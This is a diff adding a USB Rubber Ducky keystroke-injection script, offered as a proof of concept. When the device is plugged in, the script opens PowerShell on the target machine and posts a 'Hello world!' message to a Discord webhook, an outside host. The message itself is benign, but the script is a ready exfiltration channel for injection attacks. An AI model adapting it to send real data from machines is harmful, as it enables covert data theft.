@@ -1,0 +1,20 @@
+REM By Joshua O' Brien
+REM POC of sending simple text to a server via a discord webhook using powershell commands
+REM Webhook POC v1
+DEFAULT_DELAY 500
+GUI r
+STRING powershell
+ENTER
+REM save the webhook as a variable
+STRING $hookurl = ""
+ENTER
+STRING $content = @" 
+ENTER
+STRING Hello world!
+ENTER
+STRING "@
+ENTER 
+STRING $payload = [PSCustomObject]@{ content = $content } 
+ENTER
+STRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
+ENTER
